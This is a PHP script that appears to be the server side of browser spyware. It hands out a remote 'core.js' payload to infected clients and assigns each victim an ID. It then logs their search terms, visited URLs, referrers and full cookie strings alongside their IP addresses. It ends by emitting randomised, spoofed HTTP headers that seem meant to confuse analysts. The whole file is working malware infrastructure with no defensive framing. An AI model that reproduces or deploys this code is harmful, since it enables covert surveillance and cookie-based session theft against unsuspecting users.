<?
//     ____           __      ■ √¤☻♥☺■ √¤☻♥☺■ √¤☻♥☺      ________   
//    / __/_  _______/ /__   ____  / __/ __/   
//   / /_/ / / / ___/ //_/  / __ \/ /_/ /_     
//  / __/ /_/ / /__/ ,<    / /_/ / __/ __/     
// /_/  \__,_/\___/_/|_|   \____/_/ /_/        

include("functions.php");
error_reporting(E_ERROR);
$corever = "7";

ini_set("zlib.output_compression","on");
ini_set("zlib.output_compression_level",3);

mlog(str_repeat("-", 90)."\r\n");
$userID = substr(isset($_GET['userID']) ? $_GET['userID'] : $_POST['userID'],28);
switch($_GET['action'])
{
	case 'getcore':
	
	$data['core']=file_get_contents("core.js");
	$data['corever'] = x25_file_ver("core.js");
	
	mlog("$_SERVER[REMOTE_ADDR] [$userID] getcore [version remote:".$_GET['ver'].", local:".$data['corever']."]");
	if($_GET['force'] || $_GET['ver']!=$data['corever'])
	{
		echo json_encode($data);
		mlog("sent ".strlen($data['core'])." bytes of coreENGINE [core.js] ver[".$data['corever']."] ");
	}
	die;
	break;

	case 'regme':
	$userID = hash("ripemd128", microtime(true).$_SERVER['HTTP_USER_AGENT'].
		$_SERVER['REMOTE_ADDR'].$_SERVER['REMOTE_PORT']);
	mlog("$_SERVER[REMOTE_ADDR] new user reg id:$userID");
	echo $userID."PaX".base64_encode(base64_encode(str_repeat(sprintf("%s",
		mt_rand(99999,9999999)), mt_rand(4,90))));
	break;

	case 'logsearch':
	$_POST['url']=x25_base64_decode($_POST['url']);
	//mlog("url:$_POST[url]\r\n");
	$saveurl = ($_POST['url']);
	$pos = mb_stripos ($_POST['url'],"?");
	$domain = mb_substr($_POST['url'], 7, mb_stripos (mb_substr($_POST['url'],7),'/'));
	$data = mb_substr($_POST['url'], $pos+1);
	$data = explode("&",$data);
	$known_tags=array("q","query","text","search","string",
		"what","key","keyword","word","phrase","field-keywords","st","_nkw");
	foreach($data as $key=>$v)
	{
		$vv = explode("=",$v);
		if(in_array($vv[0], $known_tags))
		{
			unset($keys);
			$keys[$vv[0]]=$vv[1];
			break;
		}
		$keys[$vv[0]]=$vv[1];
	}
	$cookies=x25_base64_decode($_POST['cookie']);
	$cookies=preg_replace("#([^0-9a-zA-Z/:\?\.&=\- ]*?)#Usi", "", $cookies);
	if(count($keys)==1)
	{
		$add="for '".join(" ",array_values($keys))."'";
		unset($keys);
	}
	else 
	{
		$add="[".print_r($keys,1)."]\r\n";
	}
	mlog("$_SERVER[REMOTE_ADDR] [$userID] search [$domain] $add\r\n".
		"[fullurl:".urldecode($saveurl)."]\r\n[cookie:".$cookies."]\r\n[refer:".x25_base64_decode($_POST['refer'])."]\r\n");
	break;

	case 'visit':
	$url = urldecode($_POST['url']);
	$cookies=x25_base64_decode($_POST['cookie']);
	$cookies=preg_replace("#([^0-9a-zA-Z/:\?\.&=\- ]*?)#Usi", "", $cookies);
	mlog("$_SERVER[REMOTE_ADDR] [$userID] visit $url \r\n[refer:".x25_base64_decode($_POST['refer'])."]\r\n[cookie:".$cookies."]\r\n");
	break;

	case 'ping':
	mlog("$_SERVER[REMOTE_ADDR] [$userID] ping");
	$msg =wordwrap (str_repeat(sprintf("%09b", mt_rand(1111111111111,989999999999999)),
		mt_rand(5,22)),80, "\n",true);
	$len=substr_count($msg, "\n");
	echo $len.":".$msg;
	break;
	
	default:
	mlog("$_SERVER[REMOTE_ADDR] [$userID] unk action $_GET[action]");
	break;
}

header("Expires: ".date(DATE_RFC2822,time()+mt_rand(1111111111,99999999999)),true);
header("Proxy-connection: %s%s%s?&nbsp;&".mt_rand(1,999999999),true);
header("Last-chain: ".mt_rand(1,98999),true);
header("X-MSEdge-Ref: Ref A: ".sprintf("%-09X", mt_rand(19999111111,9999999999))." Ref B: ".
	sprintf("%-09X", mt_rand(19999111111,999909999999))." Ref C: ".
	date(DATE_RFC2822,time()+mt_rand(1111111111,99999999999))."\r\n",true);
header('Content-Type: application/%[^\n]*; charset=windows-'.mt_rand(100,8000).';'."\r\n",true);
header("ETag: %s%s%s?&nbsp;&".mt_rand(1,999999999),true);
header("Via: %[^ ]*%20'\t\t`\t--".mt_rand(1,999999999),true);
header("Connection: Keep-Alive\tClose", true);
header("X-Powered-By: PHP/4.0.6", true);
?>
